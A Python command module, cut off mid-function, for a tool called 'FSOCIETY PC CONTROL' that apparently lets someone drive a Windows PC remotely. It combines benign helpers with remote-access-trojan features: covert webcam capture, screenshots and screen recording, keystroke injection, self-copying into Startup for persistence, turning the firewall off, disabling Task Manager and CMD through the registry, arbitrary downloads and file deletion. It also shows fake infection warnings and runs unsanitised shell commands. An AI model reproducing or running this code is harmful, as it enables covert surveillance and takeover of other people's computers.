# -*- coding: utf-8 -*-
"""
commands.py — Модуль всех команд для FSOCIETY PC CONTROL
200+ функций: питание, экран, программы, сайты, приколы, система, файлы и т.д.
"""

import subprocess
import os
import time
import psutil
import webbrowser
import requests
import socket
import platform
import ctypes
import random
import shutil
import winreg
import pyautogui
from PIL import ImageGrab, Image
from io import BytesIO

# ============================================================
# 1. ПИТАНИЕ (10 функций)
# ============================================================

def shutdown():
    os.system("shutdown /s /f /t 5")
    return "⛔ ПК выключается через 5 секунд"

def restart():
    os.system("shutdown /r /f /t 5")
    return "🔄 ПК перезагружается через 5 секунд"

def lock_pc():
    os.system("rundll32.exe user32.dll,LockWorkStation")
    return "🔒 ПК заблокирован"

def logout():
    os.system("shutdown /l /f")
    return "🚪 Выход из системы"

def sleep_pc():
    os.system("rundll32.exe powrprof.dll,SetSuspendState 0,1,0")
    return "💤 Спящий режим"

def hibernate():
    os.system("shutdown /h")
    return "💤 Гибернация"

def cancel_shutdown():
    os.system("shutdown /a")
    return "⏹️ Выключение отменено"

def shutdown_timer(seconds=60):
    os.system(f"shutdown /s /f /t {seconds}")
    return f"⛔ Выключение через {seconds} секунд"

def restart_timer(seconds=60):
    os.system(f"shutdown /r /f /t {seconds}")
    return f"🔄 Перезагрузка через {seconds} секунд"

def lock_keyboard():
    os.system("rundll32.exe user32.dll,BlockInput")
    return "🔒 Клавиатура заблокирована"

# ============================================================
# 2. ЭКРАН (15 функций)
# ============================================================

def screenshot():
    try:
        img = ImageGrab.grab()
        path = f"screenshot_{int(time.time())}.png"
        img.save(path)
        return path
    except Exception as e:
        return f"❌ Ошибка: {e}"

def screenshot_save():
    try:
        img = ImageGrab.grab()
        path = os.path.join(os.path.expanduser("~"), "Desktop", f"screenshot_{int(time.time())}.png")
        img.save(path)
        return f"✅ Скриншот сохранён: {path}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def monitor_off():
    os.system("nircmd monitor off")
    return "🖥️ Монитор выключен"

def monitor_on():
    os.system("nircmd monitor on")
    return "🖥️ Монитор включён"

def monitor_standby():
    os.system("nircmd monitor standby")
    return "💤 Монитор в режиме ожидания"

def rotate_screen_90():
    os.system("nircmd win rotate 90")
    return "🔄 Экран повёрнут на 90°"

def rotate_screen_180():
    os.system("nircmd win rotate 180")
    return "🔄 Экран повёрнут на 180°"

def rotate_screen_270():
    os.system("nircmd win rotate 270")
    return "🔄 Экран повёрнут на 270°"

def rotate_screen_0():
    os.system("nircmd win rotate 0")
    return "🔄 Поворот экрана сброшен"

def cursor_0_0():
    os.system("nircmd setcursor 0 0")
    return "🖱️ Курсор в 0,0"

def screen_resolution():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        return f"📐 Разрешение: {user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
    except:
        return "❌ Ошибка"

def screen_info():
    try:
        import ctypes
        user32 = ctypes.windll.user32
        return f"🖥️ Экран: {user32.GetSystemMetrics(0)}x{user32.GetSystemMetrics(1)}"
    except:
        return "❌ Ошибка"

def record_screen():
    try:
        import cv2
        import numpy as np
        from PIL import ImageGrab
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        path = os.path.join(os.path.expanduser("~"), "Desktop", f"recording_{timestamp}.avi")
        screen = ImageGrab.grab()
        width, height = screen.size
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter(path, fourcc, 10.0, (width, height))
        for _ in range(100):
            screen = np.array(ImageGrab.grab())
            out.write(screen)
            time.sleep(0.1)
        out.release()
        return f"✅ Запись сохранена: {path}"
    except Exception as e:
        return f"❌ Ошибка записи: {e}"

def take_photo():
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if ret:
            path = os.path.join(os.path.expanduser("~"), "Desktop", f"photo_{int(time.time())}.jpg")
            cv2.imwrite(path, frame)
            return f"📸 Фото сохранено: {path}"
        return "❌ Камера не найдена"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def brightness_up():
    os.system("nircmd changebrightness 10")
    return "🔆 Яркость увеличена"

def brightness_down():
    os.system("nircmd changebrightness -10")
    return "🔅 Яркость уменьшена"

# ============================================================
# 3. ПРОГРАММЫ (30 функций)
# ============================================================

def open_cmd():
    subprocess.Popen("cmd.exe", shell=True)
    return "💻 CMD открыт"

def open_powershell():
    subprocess.Popen("powershell.exe", shell=True)
    return "⚡ PowerShell открыт"

def open_notepad():
    subprocess.Popen("notepad.exe", shell=True)
    return "📝 Блокнот открыт"

def open_calc():
    subprocess.Popen("calc.exe", shell=True)
    return "🧮 Калькулятор открыт"

def open_explorer():
    subprocess.Popen("explorer.exe", shell=True)
    return "📂 Проводник открыт"

def open_taskmgr():
    subprocess.Popen("taskmgr.exe", shell=True)
    return "📊 Диспетчер задач открыт"

def open_paint():
    subprocess.Popen("mspaint.exe", shell=True)
    return "🎨 Paint открыт"

def open_snippingtool():
    subprocess.Popen("snippingtool.exe", shell=True)
    return "✂️ Ножницы открыты"

def open_control():
    subprocess.Popen("control.exe", shell=True)
    return "⚙️ Панель управления открыта"

def open_devmgmt():
    subprocess.Popen("devmgmt.msc", shell=True)
    return "🖥️ Диспетчер устройств открыт"

def open_msconfig():
    subprocess.Popen("msconfig.exe", shell=True)
    return "⚙️ msconfig открыт"

def open_regedit():
    subprocess.Popen("regedit.exe", shell=True)
    return "📝 Редактор реестра открыт"

def open_charmap():
    subprocess.Popen("charmap.exe", shell=True)
    return "🔣 Таблица символов открыта"

def open_magnify():
    subprocess.Popen("magnify.exe", shell=True)
    return "🔍 Лупа открыта"

def open_osk():
    subprocess.Popen("osk.exe", shell=True)
    return "⌨️ Экранная клавиатура открыта"

def open_winver():
    subprocess.Popen("winver.exe", shell=True)
    return "ℹ️ Информация о Windows"

def open_dxdiag():
    subprocess.Popen("dxdiag.exe", shell=True)
    return "📊 dxdiag открыт"

def open_diskmgmt():
    subprocess.Popen("diskmgmt.msc", shell=True)
    return "💾 Управление дисками открыто"

def open_eventvwr():
    subprocess.Popen("eventvwr.msc", shell=True)
    return "📋 Просмотр событий открыт"

def open_services():
    subprocess.Popen("services.msc", shell=True)
    return "⚙️ Службы открыты"

def open_perfmon():
    subprocess.Popen("perfmon.msc", shell=True)
    return "📊 Монитор производительности открыт"

def open_resmon():
    subprocess.Popen("resmon.exe", shell=True)
    return "📊 Монитор ресурсов открыт"

def open_cleanmgr():
    subprocess.Popen("cleanmgr.exe", shell=True)
    return "🧹 Очистка диска открыта"

def open_dfrag():
    subprocess.Popen("dfrgui.exe", shell=True)
    return "🔄 Дефрагментация открыта"

def open_mdsched():
    subprocess.Popen("mdsched.exe", shell=True)
    return "🧠 Проверка памяти открыта"

def open_winupdate():
    os.system("start ms-settings:windowsupdate")
    return "🔄 Центр обновления открыт"

def open_settings():
    os.system("start ms-settings:")
    return "⚙️ Параметры Windows открыты"

def open_camera():
    os.system("start microsoft.windows.camera:")
    return "📷 Камера открыта"

def open_store():
    os.system("start ms-windows-store:")
    return "🛒 Microsoft Store открыт"

def open_snip():
    os.system("start ms-screenclip:")
    return "✂️ Скриншот-инструмент открыт"

def open_explorer_path(path="C:\\"):
    subprocess.Popen(f'explorer.exe "{path}"', shell=True)
    return f"📂 Проводник открыт: {path}"

# ============================================================
# 4. САЙТЫ (25 функций)
# ============================================================

def open_url(url):
    if not url.startswith("http"):
        url = "https://" + url
    webbrowser.open(url)
    return f"🌐 Открыт сайт: {url}"

def open_youtube():
    webbrowser.open("https://youtube.com")
    return "🌐 YouTube открыт"

def open_google():
    webbrowser.open("https://google.com")
    return "🌐 Google открыт"

def open_vk():
    webbrowser.open("https://vk.com")
    return "🌐 VK открыт"

def open_github():
    webbrowser.open("https://github.com")
    return "🌐 GitHub открыт"

def open_twitch():
    webbrowser.open("https://twitch.tv")
    return "🌐 Twitch открыт"

def open_discord():
    webbrowser.open("https://discord.com")
    return "🌐 Discord открыт"

def open_telegram():
    webbrowser.open("https://t.me")
    return "🌐 Telegram открыт"

def open_reddit():
    webbrowser.open("https://reddit.com")
    return "🌐 Reddit открыт"

def open_twitter():
    webbrowser.open("https://twitter.com")
    return "🌐 Twitter открыт"

def open_instagram():
    webbrowser.open("https://instagram.com")
    return "🌐 Instagram открыт"

def open_tiktok():
    webbrowser.open("https://tiktok.com")
    return "🌐 TikTok открыт"

def open_chatgpt():
    webbrowser.open("https://chat.openai.com")
    return "🌐 ChatGPT открыт"

def open_wikipedia():
    webbrowser.open("https://wikipedia.org")
    return "🌐 Wikipedia открыта"

def open_yandex():
    webbrowser.open("https://yandex.ru")
    return "🌐 Яндекс открыт"

def open_mail():
    webbrowser.open("https://mail.ru")
    return "🌐 Mail.ru открыт"

def open_ok():
    webbrowser.open("https://ok.ru")
    return "🌐 Одноклассники открыты"

def open_steam():
    webbrowser.open("https://store.steampowered.com")
    return "🌐 Steam открыт"

def open_epic():
    webbrowser.open("https://store.epicgames.com")
    return "🌐 Epic Games открыт"

def open_spotify():
    webbrowser.open("https://open.spotify.com")
    return "🌐 Spotify открыт"

def open_netflix():
    webbrowser.open("https://netflix.com")
    return "🌐 Netflix открыт"

def open_rickroll():
    webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    return "🎵 Rickroll запущен!"

def open_rickroll_5():
    for _ in range(5):
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        time.sleep(0.5)
    return "🎵 5 Rickroll!"

def open_rickroll_10():
    for _ in range(10):
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        time.sleep(0.3)
    return "🎵 10 Rickroll!"

def open_rickroll_20():
    for _ in range(20):
        webbrowser.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
        time.sleep(0.2)
    return "🎵 20 Rickroll!"

# ============================================================
# 5. ПРИКОЛЫ (20 функций)
# ============================================================

def kill_explorer():
    os.system("taskkill /f /im explorer.exe")
    return "💀 Explorer убит"

def restore_explorer():
    os.system("start explorer.exe")
    return "🔄 Explorer восстановлен"

def max_volume():
    os.system("nircmd changesysvolume 65535")
    return "🔊 Громкость на максимум"

def mute_volume():
    os.system("nircmd mutesysvolume 1")
    return "🔇 Звук отключён"

def unmute_volume():
    os.system("nircmd mutesysvolume 0")
    return "🔊 Звук включён"

def volume_up():
    os.system("nircmd changesysvolume 2000")
    return "🔊 Громкость +"

def volume_down():
    os.system("nircmd changesysvolume -2000")
    return "🔉 Громкость -"

def open_firefox_10():
    for _ in range(10):
        subprocess.Popen("firefox.exe", shell=True)
        time.sleep(0.3)
    return "🦊 10 Firefox открыто!"

def open_chrome_10():
    for _ in range(10):
        subprocess.Popen("chrome.exe", shell=True)
        time.sleep(0.3)
    return "🌐 10 Chrome открыто!"

def open_notepad_10():
    for _ in range(10):
        subprocess.Popen("notepad.exe", shell=True)
        time.sleep(0.2)
    return "📝 10 Блокнотов открыто!"

def open_calc_10():
    for _ in range(10):
        subprocess.Popen("calc.exe", shell=True)
        time.sleep(0.2)
    return "🧮 10 Калькуляторов открыто!"

def fake_bsod():
    try:
        root = ctypes.windll.user32
        root.MessageBoxW(0, "A problem has been detected and Windows has been shut down.", "BSOD", 0x10)
        return "💀 Фейковый BSOD показан"
    except:
        return "❌ Ошибка"

def fake_error():
    ctypes.windll.user32.MessageBoxW(0, "Критическая ошибка!", "Error", 0x10)
    return "⚠️ Фейковая ошибка показана"

def fake_warning():
    ctypes.windll.user32.MessageBoxW(0, "Ваш ПК заражён!", "Warning", 0x30)
    return "⚠️ Фейковое предупреждение"

def fake_info():
    ctypes.windll.user32.MessageBoxW(0, "Это сообщение!", "Info", 0x40)
    return "ℹ️ Фейковое сообщение"

def flip_screen():
    os.system("nircmd win rotate 180")
    return "🔄 Экран перевёрнут"

def hide_taskbar():
    os.system("nircmd win hide class Shell_TrayWnd")
    return "👻 Панель задач скрыта"

def show_taskbar():
    os.system("nircmd win show class Shell_TrayWnd")
    return "👻 Панель задач показана"

def disable_taskbar():
    os.system("taskkill /f /im explorer.exe")
    return "💀 Панель задач отключена"

def enable_taskbar():
    os.system("start explorer.exe")
    return "🔄 Панель задач включена"

def open_100_notepad():
    for _ in range(100):
        subprocess.Popen("notepad.exe", shell=True)
        time.sleep(0.05)
    return "📝 100 Блокнотов открыто!"

# ============================================================
# 6. СИСТЕМА (30 функций)
# ============================================================

def get_status():
    cpu = psutil.cpu_percent()
    ram = psutil.virtual_memory().percent
    disk = psutil.disk_usage('/').percent
    bat = psutil.sensors_battery()
    bat_status = f"{bat.percent}%" if bat else "Нет данных"
    return f"📊 CPU: {cpu}%\nRAM: {ram}%\nДиск: {disk}%\nБатарея: {bat_status}"

def get_cpu():
    return f"⚡ CPU: {psutil.cpu_percent()}%"

def get_ram():
    return f"🧠 RAM: {psutil.virtual_memory().percent}%"

def get_disk():
    return f"💾 Диск: {psutil.disk_usage('/').percent}%"

def get_battery():
    bat = psutil.sensors_battery()
    if bat:
        return f"🔋 Батарея: {bat.percent}%"
    return "🔋 Батарея: нет данных"

def get_uptime():
    uptime = time.time() - psutil.boot_time()
    return f"⏱️ Аптайм: {int(uptime // 3600)}ч {int((uptime % 3600) // 60)}м"

def get_os():
    return f"🖥️ ОС: {platform.system()} {platform.release()}"

def get_hostname():
    return f"🖥️ Имя ПК: {socket.gethostname()}"

def get_username():
    return f"👤 Пользователь: {os.getlogin()}"

def get_ip():
    try:
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        return f"🌐 IP: {ip}"
    except:
        return "❌ Ошибка"

def get_mac():
    try:
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1])
        return f"🌐 MAC: {mac}"
    except:
        return "❌ Ошибка"

def list_processes():
    try:
        result = subprocess.run("tasklist", shell=True, capture_output=True, text=True)
        return f"📋 Процессы:\n{result.stdout[:3000]}"
    except:
        return "❌ Ошибка"

def kill_process(name):
    os.system(f"taskkill /f /im {name}")
    return f"💀 Процесс {name} убит"

def start_process(name):
    subprocess.Popen(name, shell=True)
    return f"✅ Процесс {name} запущен"

def systeminfo():
    try:
        result = subprocess.run("systeminfo", shell=True, capture_output=True, text=True)
        return result.stdout[:3000]
    except:
        return "❌ Ошибка"

def ipconfig():
    try:
        result = subprocess.run("ipconfig", shell=True, capture_output=True, text=True)
        return result.stdout[:3000]
    except:
        return "❌ Ошибка"

def ping_google():
    try:
        result = subprocess.run("ping google.com -n 4", shell=True, capture_output=True, text=True)
        return result.stdout[:2000]
    except:
        return "❌ Ошибка"

def flush_dns():
    os.system("ipconfig /flushdns")
    return "🔄 DNS очищен"

def netstat():
    try:
        result = subprocess.run("netstat -an", shell=True, capture_output=True, text=True)
        return result.stdout[:3000]
    except:
        return "❌ Ошибка"

def arp_table():
    try:
        result = subprocess.run("arp -a", shell=True, capture_output=True, text=True)
        return result.stdout[:2000]
    except:
        return "❌ Ошибка"

def route_print():
    try:
        result = subprocess.run("route print", shell=True, capture_output=True, text=True)
        return result.stdout[:2000]
    except:
        return "❌ Ошибка"

def wifi_networks():
    try:
        result = subprocess.run("netsh wlan show networks", shell=True, capture_output=True, text=True)
        return result.stdout[:2000]
    except:
        return "❌ Ошибка"

def add_to_startup():
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        current = os.path.abspath(__file__)
        shutil.copy2(current, startup)
        return "🚀 Добавлено в автозагрузку"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def remove_from_startup():
    try:
        startup = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        current_name = os.path.basename(__file__)
        path = os.path.join(startup, current_name)
        if os.path.exists(path):
            os.remove(path)
        return "🗑️ Убрано из автозагрузки"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def clean_temp():
    try:
        os.system("del /f /s /q %temp%\\*")
        return "🧹 Temp очищен"
    except:
        return "❌ Ошибка"

def clean_wintemp():
    try:
        os.system("del /f /s /q C:\\Windows\\Temp\\*")
        return "🧹 Windows Temp очищен"
    except:
        return "❌ Ошибка"

def empty_recycle():
    try:
        os.system("rd /s /q C:\\$Recycle.bin")
        return "🗑️ Корзина очищена"
    except:
        return "❌ Ошибка"

def open_firewall():
    os.system("wf.msc")
    return "🛡️ Брандмауэр открыт"

def disable_firewall():
    os.system("netsh advfirewall set allprofiles state off")
    return "🔓 Брандмауэр отключён"

def enable_firewall():
    os.system("netsh advfirewall set allprofiles state on")
    return "🔒 Брандмауэр включён"

def get_installed_programs():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall")
        programs = []
        for i in range(winreg.QueryInfoKey(key)[0]):
            try:
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                programs.append(name)
            except:
                pass
        return "📦 Программы:\n" + "\n".join(programs[:50])
    except:
        return "❌ Ошибка"

# ============================================================
# 7. ФАЙЛЫ (25 функций)
# ============================================================

def list_files(path="."):
    try:
        files = os.listdir(path)
        return f"📁 Файлы в {path}:\n" + "\n".join(files[:50])
    except:
        return "❌ Папка не найдена"

def create_file(name, content=""):
    try:
        with open(name, 'w', encoding='utf-8') as f:
            f.write(content)
        return f"✅ Файл {name} создан"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def delete_file(path):
    try:
        os.remove(path)
        return f"✅ Файл {path} удалён"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def copy_file(src, dst):
    try:
        shutil.copy2(src, dst)
        return f"✅ Файл скопирован: {src} → {dst}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def move_file(src, dst):
    try:
        shutil.move(src, dst)
        return f"✅ Файл перемещён: {src} → {dst}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def rename_file(old, new):
    try:
        os.rename(old, new)
        return f"✅ Файл переименован: {old} → {new}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def create_dir(path):
    try:
        os.makedirs(path, exist_ok=True)
        return f"✅ Папка {path} создана"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def delete_dir(path):
    try:
        shutil.rmtree(path)
        return f"✅ Папка {path} удалена"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def download_file(url):
    try:
        filename = url.split("/")[-1]
        response = requests.get(url, stream=True, timeout=30)
        with open(filename, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        return f"✅ Скачан файл: {filename}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def file_info(path):
    try:
        size = os.path.getsize(path)
        return f"📄 Файл: {path}\nРазмер: {size} байт"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def disk_usage():
    try:
        usage = psutil.disk_usage('/')
        return f"💾 Диск: {usage.used // (1024**3)} GB / {usage.total // (1024**3)} GB"
    except:
        return "❌ Ошибка"

def open_file(path):
    try:
        os.startfile(path)
        return f"✅ Файл открыт: {path}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def open_folder(path="."):
    try:
        os.startfile(path)
        return f"✅ Папка открыта: {path}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def search_files(query, path="C:\\"):
    try:
        result = []
        for root, dirs, files in os.walk(path):
            for file in files:
                if query.lower() in file.lower():
                    result.append(os.path.join(root, file))
                    if len(result) >= 20:
                        break
            if len(result) >= 20:
                break
        return "🔍 Найдено:\n" + "\n".join(result) if result else "🔍 Ничего не найдено"
    except:
        return "❌ Ошибка"

def read_file(path):
    try:
        with open(path, 'r', encoding='utf-8') as f:
            return f.read()[:3000]
    except Exception as e:
        return f"❌ Ошибка: {e}"

def write_file(path, content):
    try:
        with open(path, 'w', encoding='utf-8') as f:
            f.write(content)
        return f"✅ Записано в {path}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def append_file(path, content):
    try:
        with open(path, 'a', encoding='utf-8') as f:
            f.write(content)
        return f"✅ Добавлено в {path}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def zip_folder(path, output):
    try:
        shutil.make_archive(output, 'zip', path)
        return f"✅ Архив создан: {output}.zip"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def unzip_file(path, output):
    try:
        shutil.unpack_archive(path, output)
        return f"✅ Архив распакован: {output}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def hash_file(path):
    try:
        import hashlib
        with open(path, 'rb') as f:
            return hashlib.md5(f.read()).hexdigest()
    except Exception as e:
        return f"❌ Ошибка: {e}"

def file_exists(path):
    return "✅ Файл существует" if os.path.exists(path) else "❌ Файл не найден"

def dir_exists(path):
    return "✅ Папка существует" if os.path.isdir(path) else "❌ Папка не найдена"

def current_dir():
    return f"📁 Текущая папка: {os.getcwd()}"

def change_dir(path):
    try:
        os.chdir(path)
        return f"✅ Перешли в {path}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def get_file_size(path):
    try:
        size = os.path.getsize(path)
        if size < 1024:
            return f"📄 {size} B"
        elif size < 1024**2:
            return f"📄 {size / 1024:.2f} KB"
        else:
            return f"📄 {size / 1024**2:.2f} MB"
    except Exception as e:
        return f"❌ Ошибка: {e}"

# ============================================================
# 8. МЫШЬ И КЛАВИАТУРА (15 функций)
# ============================================================

def mouse_move(x, y):
    pyautogui.moveTo(x, y)
    return f"🖱️ Мышь перемещена в {x},{y}"

def mouse_click():
    pyautogui.click()
    return "🖱️ Клик"

def mouse_right_click():
    pyautogui.rightClick()
    return "🖱️ ПКМ"

def mouse_double_click():
    pyautogui.doubleClick()
    return "🖱️ Двойной клик"

def mouse_scroll(amount):
    pyautogui.scroll(amount)
    return f"🖱️ Скролл {amount}"

def key_press(key):
    pyautogui.press(key)
    return f"⌨️ Клавиша {key}"

def type_text(text):
    pyautogui.typewrite(text)
    return f"⌨️ Напечатано: {text}"

def hotkey(*keys):
    pyautogui.hotkey(*keys)
    return f"⌨️ Комбинация: {'+'.join(keys)}"

def press_enter():
    pyautogui.press('enter')
    return "⌨️ Enter"

def press_escape():
    pyautogui.press('escape')
    return "⌨️ Escape"

def press_tab():
    pyautogui.press('tab')
    return "⌨️ Tab"

def press_space():
    pyautogui.press('space')
    return "⌨️ Space"

def press_backspace():
    pyautogui.press('backspace')
    return "⌨️ Backspace"

def press_delete():
    pyautogui.press('delete')
    return "⌨️ Delete"

def press_win():
    pyautogui.press('win')
    return "⌨️ Win"

def press_alt_f4():
    pyautogui.hotkey('alt', 'f4')
    return "⌨️ Alt+F4"

def press_ctrl_c():
    pyautogui.hotkey('ctrl', 'c')
    return "⌨️ Ctrl+C"

def press_ctrl_v():
    pyautogui.hotkey('ctrl', 'v')
    return "⌨️ Ctrl+V"

def press_ctrl_a():
    pyautogui.hotkey('ctrl', 'a')
    return "⌨️ Ctrl+A"

def press_ctrl_s():
    pyautogui.hotkey('ctrl', 's')
    return "⌨️ Ctrl+S"

# ============================================================
# 9. ОБОИ (5 функций)
# ============================================================

def set_wallpaper(path):
    try:
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return "✅ Обои установлены"
    except:
        return "❌ Ошибка"

def set_wallpaper_url(url):
    try:
        headers = {'User-Agent': 'Mozilla/5.0'}
        response = requests.get(url, headers=headers, timeout=15, stream=True)
        if response.status_code == 200:
            img = Image.open(BytesIO(response.content)).convert('RGB')
            path = os.path.join(os.environ['TEMP'], 'wallpaper_temp.jpg')
            img.save(path, 'JPEG', quality=95)
            return set_wallpaper(path)
        return "❌ Не удалось скачать"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def set_wallpaper_random():
    try:
        folder = r"C:\Users\Public\Pictures"
        if os.path.exists(folder):
            images = [f for f in os.listdir(folder) if f.endswith(('.jpg', '.png', '.jpeg'))]
            if images:
                img = os.path.join(folder, random.choice(images))
                return set_wallpaper(img)
        return "❌ Нет изображений"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reset_wallpaper():
    try:
        path = os.path.join(os.environ['WINDIR'], 'Web', 'Wallpaper', 'Windows', 'img0.jpg')
        return set_wallpaper(path)
    except:
        return "❌ Ошибка"

def get_wallpaper():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop")
        value = winreg.QueryValueEx(key, "Wallpaper")[0]
        return f"🖼️ Обои: {value}"
    except:
        return "❌ Ошибка"

# ============================================================
# 10. УВЕДОМЛЕНИЯ (5 функций)
# ============================================================

def show_message(text, title="FSOCIETY"):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x40)
        return f"💬 Сообщение показано: {text}"
    except:
        return "❌ Ошибка"

def show_warning(text, title="Warning"):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x30)
        return f"⚠️ Предупреждение показано: {text}"
    except:
        return "❌ Ошибка"

def show_error(text, title="Error"):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x10)
        return f"❌ Ошибка показана: {text}"
    except:
        return "❌ Ошибка"

def show_question(text, title="Question"):
    try:
        result = ctypes.windll.user32.MessageBoxW(0, text, title, 0x04)
        return f"❓ Вопрос задан: {text}"
    except:
        return "❌ Ошибка"

def show_info(text, title="Info"):
    try:
        ctypes.windll.user32.MessageBoxW(0, text, title, 0x40)
        return f"ℹ️ Информация показана: {text}"
    except:
        return "❌ Ошибка"

# ============================================================
# 11. РЕЕСТР (10 функций)
# ============================================================

def reg_read(path, name):
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
        value = winreg.QueryValueEx(key, name)[0]
        return f"📝 {name} = {value}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reg_write(path, name, value):
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
        return f"✅ Записано: {name} = {value}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reg_delete(path, name):
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, name)
        return f"✅ Удалено: {name}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reg_list(path):
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, path)
        values = []
        for i in range(winreg.QueryInfoKey(key)[1]):
            name, value, _ = winreg.EnumValue(key, i)
            values.append(f"{name} = {value}")
        return "📝 Значения:\n" + "\n".join(values[:20])
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reg_create_key(path):
    try:
        import winreg
        winreg.CreateKey(winreg.HKEY_CURRENT_USER, path)
        return f"✅ Ключ создан: {path}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reg_delete_key(path):
    try:
        import winreg
        winreg.DeleteKey(winreg.HKEY_CURRENT_USER, path)
        return f"✅ Ключ удалён: {path}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reg_disable_taskmgr():
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        return "🔒 Диспетчер задач отключён"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reg_enable_taskmgr():
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
        return "🔓 Диспетчер задач включён"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reg_disable_cmd():
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System")
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1)
        return "🔒 CMD отключён"
    except Exception as e:
        return f"❌ Ошибка: {e}"

def reg_enable_cmd():
    try:
        import winreg
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Policies\Microsoft\Windows\System")
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 0)
        return "🔓 CMD включён"
    except Exception as e:
        return f"❌ Ошибка: {e}"

# ============================================================
# 12. СЛУЖБЫ (10 функций)
# ============================================================

def list_services():
    try:
        result = subprocess.run("sc query", shell=True, capture_output=True, text=True)
        return result.stdout[:3000]
    except:
        return "❌ Ошибка"

def start_service(name):
    os.system(f"net start {name}")
    return f"✅ Служба {name} запущена"

def stop_service(name):
    os.system(f"net stop {name}")
    return f"⛔ Служба {name} остановлена"

def restart_service(name):
    os.system(f"net stop {name}")
    time.sleep(1)
    os.system(f"net start {name}")
    return f"🔄 Служба {name} перезапущена"

def service_status(name):
    try:
        result = subprocess.run(f"sc query {name}", shell=True, capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

def disable_service(name):
    os.system(f"sc config {name} start= disabled")
    return f"🔒 Служба {name} отключена"

def enable_service(name):
    os.system(f"sc config {name} start= auto")
    return f"🔓 Служба {name} включена"

def list_started_services():
    try:
        result = subprocess.run("sc query state= all", shell=True, capture_output=True, text=True)
        return result.stdout[:3000]
    except:
        return "❌ Ошибка"

def open_services_msc():
    os.system("services.msc")
    return "⚙️ Службы открыты"

def service_info(name):
    try:
        result = subprocess.run(f"sc qc {name}", shell=True, capture_output=True, text=True)
        return result.stdout
    except:
        return "❌ Ошибка"

# ============================================================
# 13. ПОЛЬЗОВАТЕЛИ (10 функций)
# ============================================================

def list_users():
    try:
        result = subprocess.run("net user", shell=True, capture_output=True, text=True)
        return result.stdout
